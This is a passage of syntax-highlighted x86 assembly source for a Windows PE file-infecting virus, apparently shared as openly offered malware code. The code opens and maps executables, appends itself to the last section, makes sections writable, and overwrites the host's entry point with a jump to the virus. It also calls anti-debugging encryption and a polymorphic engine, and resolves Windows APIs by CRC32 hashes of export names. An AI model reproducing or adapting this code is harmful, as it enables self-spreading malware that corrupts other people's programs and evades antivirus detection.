        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;pointer to map</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">;EXE?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">err_mapviewed</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;filealign</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">            </span><span class="sc1">;is PE/0/0 ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">err_mapviewed</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014ch</span><span class="sc0">         </span><span class="sc1">;386</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">err_mapviewed</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014eh</span><span class="sc0">         </span><span class="sc1">;586?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">err_mapviewed</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">01ch</span><span class="sc4">],</span><span class="sc5">Jmp2VirusCodeSz</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">err_mapviewed</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;ntheader/optionalheader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">

        </span><span class="sc1">;EDI = PE    -    ESI = Section Header</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">;Find the last section (with highest PointerToRawData)</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;nr. of objects/sections</span><span class="sc0">

</span><span class="sc5">LookHighest</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;pointer to rawdata</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">NotHigher</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">NotHigher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LookHighest</span><span class="sc0">
                                                </span><span class="sc1">;EBX = choosen section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;PointerToRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;PE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;SizeOfRawData</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;updateflags</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;ESI = sections</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;MZ (StartOfMap)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Put back on stack</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;...</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">;Create JMP to virus section...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;RVA+Rawsize = VA where Virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;starts...</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpval</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;This is the value to jmp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;backup entry RVA</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">;ESI=SectionHeader</span><span class="sc0">

</span><span class="sc5">look</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Old EntryPoint (RVA)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;VirtualAddres</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;VirtualSize</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">look</span><span class="sc0"> 

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">   </span><span class="sc1">;make writable</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;sub RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;add PhysicalOffset</span><span class="sc0">
                                                </span><span class="sc1">;EAX is now the PhysicalOffset</span><span class="sc0">
                                                </span><span class="sc1">;of the EntryPoint</span><span class="sc0">
                
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;map/handle after PUSHAD</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OrgHostCode</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Jmp2VirusCodeSz</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;***        mov     edi,eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Jmp2VirusCode</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setupcryptor</span><span class="sc0">                    </span><span class="sc1">;setup antidebug crypters at</span><span class="sc0">
                                                </span><span class="sc1">;the start of the vir.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreatePoly</span><span class="sc0">                     </span><span class="sc1">;poly returns total size in ECX</span><span class="sc0">
                                                </span><span class="sc1">;ECX = end of code</span><span class="sc0">
        </span><span class="sc1">;...</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">virusVsize</span><span class="sc4">-</span><span class="sc5">virusRsize</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;is VirtualSize already big</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">noupdate</span><span class="sc0">                        </span><span class="sc1">;enough for the virus?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">noupdate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;ecx = end of code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">101d</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;eax = 101 aligned size..</span><span class="sc0">
        

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;pointer to filemap / MZ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;pointer to filemap / MZ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;pointer to filemap / MZ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;base addr. already on stack</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemaph</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;new 101 aligned size</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileh</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iSetFilePointer</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileh</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iSetEndOfFile</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc1">;We could do a jmp here over the map-closers, but that's not needed...</span><span class="sc0">

</span><span class="sc5">err_mapviewed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;base addr. already on stack</span><span class="sc0">

</span><span class="sc5">err_mapped</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemaph</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCloseHandle</span><span class="sc4">]</span><span class="sc0">
        
</span><span class="sc5">err_opened</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iCloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">err_b4_open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc5">OrgHostCode</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Jmp2VirusCodeSz</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Jmp2VirusCode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">jmpval</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Jmp2VirusCodeSz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Jmp2VirusCode</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"-OSDORP-POSSE-"</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       Retrieve needed apis</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       poorly coded, but i did it by myself :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetApis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;pointer to PE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">078h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;rva exporttable/names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">;number of f</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">;pointer to names</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;***        mov     edi,ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;***        mov     ebx,edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">


        </span><span class="sc1">;Importing the needed API's to our own 'Import table' :)</span><span class="sc0">
        

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;esi pointer to offset functions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ***     Look in export table of the dll for the API's we need</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">searchname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;edi points to name</span><span class="sc0">
        
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc32</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">searchname</span><span class="sc0">

</span><span class="sc1">;------ found name and play with it</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;edi points to exp table</span><span class="sc0">
